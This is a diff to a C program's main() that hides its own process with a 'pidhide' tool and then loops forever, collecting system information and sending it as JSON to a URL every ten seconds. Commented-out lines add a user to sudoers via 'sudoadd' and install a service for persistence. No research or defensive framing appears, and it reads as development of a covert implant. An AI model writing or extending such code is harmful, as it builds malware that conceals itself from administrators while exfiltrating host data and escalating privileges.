@@ -371,17 +371,30 @@ int main() {
 //    }
 //
     // Run pidhide on this program
+    pid_t parent_pid = getpid();
 
     pid_t hide_pid = fork();
     if (hide_pid == 0) { // Child process for hiding the PID
         char hide_cmd[256];
-        snprintf(hide_cmd, sizeof(hide_cmd), "/usr/sbin/pidhide -p %d", getpid());
-        system(hide_cmd);
-        exit(0);
-    } else if (hide_pid < 0) { // Fork failed for hide_pid
+        char pid_str[64];
+        // snprintf(hide_cmd, sizeof(hide_cmd), "/usr/sbin/pidhide -p %d", parent_pid);
+        snprintf(pid_str, sizeof(pid_str), "%d", parent_pid);
+        execl("/usr/sbin/pidhide", "pidhide", "-p", pid_str, NULL);
+        // system(hide_cmd);
+    } else if (hide_pid > 0) { // Fork failed for hide_pid
+    while (1) {
+            gather_system_info(data, sizeof(data));
+            printf("Generated JSON:\n%s\n", data);
+            send_api_call(url, data);
+
+            sleep(10); // Wait for 10 seconds before the next iteration
+        }
+    }
+    else {
         perror("fork");
         exit(1); // Exit if fork fails
     }
+
 //
 //    // Run sudo_add as a daemon
 //    snprintf(cmd, sizeof(cmd), "/usr/sbin/sudoadd -u %s", username);
@@ -392,12 +405,4 @@ int main() {
 //    create_and_enable_service();
 //
     // Loop to run indefinitely
-    while (1) {
-        gather_system_info(data, sizeof(data));
-        printf("Generated JSON:\n%s\n", data);
-        send_api_call(url, data);
-
-        sleep(10); // Wait for 10 seconds before the next iteration
-    }
-    return 0;
 }
